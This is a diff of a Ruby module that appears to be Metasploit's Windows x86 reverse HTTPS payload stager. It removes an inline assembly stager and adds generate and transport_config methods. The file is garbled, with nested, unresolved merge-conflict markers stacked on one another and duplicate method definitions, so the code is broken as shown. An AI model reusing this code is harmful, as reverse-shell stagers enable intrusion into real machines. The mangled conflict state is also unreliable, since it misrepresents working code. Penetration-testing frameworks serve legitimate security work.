@@ -2,23 +2,31 @@
 
 require 'msf/core'
 <<<<<<< HEAD
+<<<<<<< HEAD
 require 'msf/core/payload/transport_config'
 =======
 >>>>>>> feature/complex-payloads
+=======
+require 'msf/core/payload/transport_config'
+>>>>>>> 4.11.2_release_pre-rails4
 require 'msf/core/payload/windows/reverse_http'
 
 module Msf
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> feature/complex-payloads
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTPS
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 module Payload::Windows::ReverseHttps
 
@@ -39,28 +47,24 @@ module Payload::Windows::ReverseHttps
     transport_config_reverse_https(opts)
 =======
 
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 module Payload::Windows::ReverseHttps
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseHttp
-
-  #
-  # Generate and compile the stager
-  #
-  def generate_reverse_https(opts={})
-    combined_asm = %Q^
-      cld                    ; Clear the direction flag.
-      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
-      #{asm_block_api}
-      start:
-        pop ebp
-      #{asm_reverse_http(opts)}
-    ^
-    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
-  end
 
   #
   # Generate the first stage
   #
+  def generate
+    super(ssl: true)
+  end
+
+  #
+  # Generate the transport-specific configuration
+  #
+<<<<<<< HEAD
   def generate
 
     # Generate the simple version of this stager if we don't have enough space
@@ -81,6 +85,10 @@ module Payload::Windows::ReverseHttps
     }
 
     generate_reverse_https(conf)
+=======
+  def transport_config(opts={})
+    transport_config_reverse_https(opts)
+>>>>>>> 4.11.2_release_pre-rails4
   end
 
   # TODO: Use the CachedSize instead (PR #4894)
